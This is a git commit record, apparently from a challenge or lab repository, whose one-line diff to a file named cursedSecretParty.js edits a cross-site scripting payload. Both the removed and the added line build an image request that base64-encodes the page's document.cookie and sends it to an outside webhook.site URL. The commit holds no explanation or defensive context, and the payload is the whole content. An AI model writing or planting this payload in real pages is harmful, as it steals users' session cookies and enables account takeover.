09b12da534ed8f18107bd228e30a5395c5a98489
papacitocs <pzedzoard@gmail.com>
2025-11-17 15:48:22 +0100

    Update cursedSecretParty.js

--- cursedSecretParty.js
+++ cursedSecretParty.js
@@ -1,1 +1,1 @@
-const img = new Image();img.src = 'https://webhook.site/b98617f1-85e9-4a3f-9c53-389f33d30a99?data='+btoa(document.cookie);
+img = new Image();img.src = 'https://webhook.site/b98617f1-85e9-4a3f-9c53-389f33d30a99?data='+btoa(document.cookie);
